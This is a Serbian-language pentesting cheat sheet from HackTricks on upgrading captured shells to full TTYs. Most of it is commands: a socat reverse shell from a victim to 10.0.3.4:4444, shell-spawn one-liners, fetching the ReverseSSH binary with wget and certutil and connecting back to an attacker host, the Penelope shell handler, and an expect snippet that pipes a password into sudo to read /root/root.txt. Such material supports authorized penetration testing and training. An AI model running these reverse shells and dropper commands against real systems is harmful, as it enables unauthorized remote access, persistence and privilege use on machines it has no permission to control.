# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` navodi validne putanje do login-shell-ova i neke ih aplikacije proveravaju; nije univerzalni preduslov za dodeljivanje PTY-ja.<sup>[[3]](#references)[[4]](#references)</sup> Ako program kao što je `pkexec` odbije `SHELL` uz poruku `The value for the SHELL variable was not found in the /etc/shells file`, proverite da li se tačna putanja do shell-a (na primer, `/bin/bash`) pojavljuje u `/etc/shells`.<sup>[[10]](#references)</sup> Sekvenca za oporavak `CTRL+Z`/`fg` u nastavku koristi Bash job control; ako trenutni shell nije Bash, pokrenite Bash pre korišćenja te sekvence.<sup>[[7]](#references)</sup>

#### Python

Python-ov `pty.spawn` pokreće program povezan sa standardnim ulaznim, izlaznim i error stream-ovima trenutnog procesa, čime Bash u ovoj sesiji dobija pseudo-terminal.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Broj **redova** i **kolona** možete dobiti pokretanjem komande **`stty -a`**; `-a` prikazuje sva trenutna podešavanja terminala. Izlaz komande zavisi od terminala, zato koristite vrednosti koje prijavljuje trenutna sesija.<sup>[[11]](#references)</sup>

#### script

`script` utility beleži sesiju terminala; ovde `/dev/null` odbacuje transkript, `-q` potiskuje poruke o pokretanju i završetku, a `-c` pokreće Bash umesto podrazumevanog shell-a.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Nakon bilo koje PTY-spawn metode, suspendujte Netcat sesiju i vratite je sa lokalnim raw režimom, zatim podesite remote terminal okruženje i dimenzije:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Osluškivač koristi trenutni terminal u raw režimu, sa onemogućenim lokalnim eho-om, i prihvata TCP connections na portu 4444. Komanda na victim-u alocira pty, povezuje stderr, kreira session, prosleđuje SIGINT i primenjuje odgovarajuća podešavanja terminala; dodajte `ctty` ako child-u treba kontrolni terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (stare verzije sa `--interactive`): `!sh`

Nmap escape zavisi od verzije: Nmap je u kasnijim izdanjima uklonio svoj režim `--interactive`, tako da se `!sh` primenjuje samo na stare verzije.<sup>[[13]](#references)</sup>

## ReverseSSH

Praktičan način za **interaktivni pristup shell-u**, kao i za **prenos datoteka** i **prosleđivanje portova**, jeste postavljanje statički linkovanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na ciljnu mašinu.<sup>[[1]](#references)</sup>

U nastavku je primer za `x86` sa objavljenim UPX-kompresovanim binarnim fajlom projekta. Za druge arhitekture ili release artefakte koristite [stranicu sa izdanjima](https://github.com/Fahrj/reverse-ssh/releases/latest/) za navigaciju.<sup>[[1]](#references)</sup>

1. Pripremite lokalni host da prihvati dolaznu SSH konekciju. U listener režimu, `-l` uključuje listener, a `-p 4444` bira port na kojem prihvata konekciju ciljne mašine.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Prenesite isti `upx_reverse-sshx86` artifact u `/dev/shm/reverse-ssh` i učinite ga izvršnim. Targetov `-p 4444` bira port listenera iznad, a `kali@10.0.0.2` navodi nalog i host koji se koriste za povezivanje ka napadaču.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows meta. Potpuno interaktivni PowerShell zahteva Windows 10 build 17763; pogledajte [README projekta](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows primer koristi `certutil` sa `-f -urlcache`; Microsoft navodi da `-f` prisiljava preuzimanje sa URL-a i napominje da se dostupni parametri razlikuju u zavisnosti od verzije, zato proverite `certutil -?` ako ovaj oblik nije dostupan.<sup>[[12]](#references)</sup>

- Nakon uspešnog uspostavljanja reverse konekcije, ReverseSSH reverse-mode listener podrazumevano vezuje port `8888` (ili vrednost prosleđenu pomoću `-b`), a dolazne konekcije prihvataju bilo koje korisničko ime sa podrazumevanom lozinkom `letmeinbrudipls`. Remote shell se izvršava sa privilegijama naloga koji je pokrenuo `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatski unapređuje Unix-like reverse shells na PTY, menja veličinu Unix-like terminala i beleži interakcije sa shellom; za Windows shellove pruža readline, ali ne i promenu veličine terminala u realnom vremenu.<sup>[[2]](#references)</sup>

Pokrenite `penelope` da podrazumevano sluša na `0.0.0.0:4444`; dolazni Unix-like shellovi se zatim mogu automatski unaprediti i beležiti.<sup>[[2]](#references)</sup>

![Penelope upravlja dolaznim shellom i unapređuje ga](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Ako iz nekog razloga ne možete da dobijete puni TTY, **i dalje možete da komunicirate sa programima** koji očekuju unos korisnika. U sledećem primeru, Expect pokreće `sudo`, čeka njegov zahtev za lozinku, šalje lozinku i vraća kontrolu pomoću `interact`; `sudo -S` čita lozinku iz standardnog ulaza. Koristite ovo samo u autorizovanoj laboratoriji i izbegavajte čuvanje stvarnih akreditiva u istoriji shell-a ili izvornim fajlovima.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Statically-linked ssh server sa reverse shell funkcionalnošću za CTF-ove i slično](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler koji automatizuje nekoliko stvari radi lakšeg rada](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux priručnik](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python dokumentacija](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux priručnik](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux priručnik](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Kontrola poslova](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux priručnik](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux priručnik](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux priručnik](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Dnevnik izmena Nmap-a](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
